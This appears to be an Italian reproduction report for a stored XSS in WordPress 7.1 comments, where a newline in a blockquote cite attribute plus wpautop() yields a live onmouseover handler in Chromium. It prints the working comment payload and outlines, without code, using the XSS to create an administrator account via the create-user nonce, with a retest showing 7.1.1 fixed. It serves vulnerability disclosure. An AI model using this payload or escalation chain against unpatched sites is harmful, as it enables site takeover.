# Evidenze della riproduzione

## Ambiente

La vulnerabilità è stata riprodotta in un ambiente clean-room con:

- WordPress 7.1
- Twenty Twenty-Five 1.5
- PHP 8.5.4
- Chromium
- commenti abilitati
- attaccante non autenticato
- vittima autenticata come Administrator

## 1. Input inviato

Il commento minimo utilizzato per dimostrare l'esecuzione JavaScript era:

    <blockquote cite="http://example.com/A
    B">Q</blockquote><a title="onmouseover=window.__WPXSS=1337//">S</a>

La newline tra `A` e `B` è parte essenziale della PoC.

## 2. Contenuto memorizzato

Il payload sopravviveva al normale percorso di sanitizzazione dei commenti.

Nel test originale il valore memorizzato risultava equivalente a:

    <blockquote cite="http://example.com/A
    B">Q</blockquote><a title="onmouseover=window.__WPXSS=1337//" rel="nofollow ugc">S</a>

Questo dimostra che non era necessario inserire direttamente un attributo evento sul `<blockquote>` durante la fase di input.

## 3. HTML prodotto durante il rendering

Dopo le trasformazioni applicate da WordPress 7.1, la risposta HTML conteneva una struttura equivalente a:

    <blockquote cite="http://example.com/A
    <p> B&#8221;>Q</p></blockquote>
    <p><a title="onmouseover=window.__WPXSS=1337//" rel="nofollow ugc">S</a></p>

La struttura risultante è differente dal contenuto precedentemente sanitizzato.

## 4. DOM interpretato da Chromium

Chromium reinterpretava l'HTML e materializzava un vero attributo evento sul `<blockquote>`:

    <blockquote
      cite="..."
      onmouseover="window.__WPXSS=1337//&quot;"
      rel="nofollow ugc">

L'attributo `onmouseover` non esisteva in quella forma nel markup originariamente accettato da WordPress.

## 5. Prova di esecuzione JavaScript

Prima dell'interazione:

    window.__WPXSS

risultava:

    undefined

Dopo il passaggio del mouse sul commento:

    window.__WPXSS

risultava:

    1337

Questo conferma l'esecuzione di JavaScript nell'origine WordPress.

## 6. Impatto privilegiato verificato

La stessa Stored XSS è stata successivamente utilizzata per dimostrare l'impatto nella sessione Administrator.

Il JavaScript:

1. effettuava una richiesta autenticata a `/wp-admin/user-new.php`;
2. estraeva il nonce `_wpnonce_create-user`;
3. inviava la richiesta di creazione utente;
4. creava un nuovo account con ruolo `administrator`.

La verifica server-side confermava la presenza del nuovo account privilegiato.

## 7. Retest su WordPress 7.1.1

La PoC originale è stata ritestata su WordPress 7.1.1.

Nel retest:

    onmouseover materializzato: NO
    JavaScript eseguito: NO
    window.__WPXSS: undefined

La catena originale non è quindi più riproducibile sulla versione corretta.

## Conclusione

Le evidenze mostrano la trasformazione completa:

    input consentito
        ->
    contenuto memorizzato
        ->
    trasformazione successiva di wpautop()
        ->
    HTML strutturalmente differente
        ->
    reinterpretazione del browser
        ->
    attributo evento reale
        ->
    JavaScript eseguito
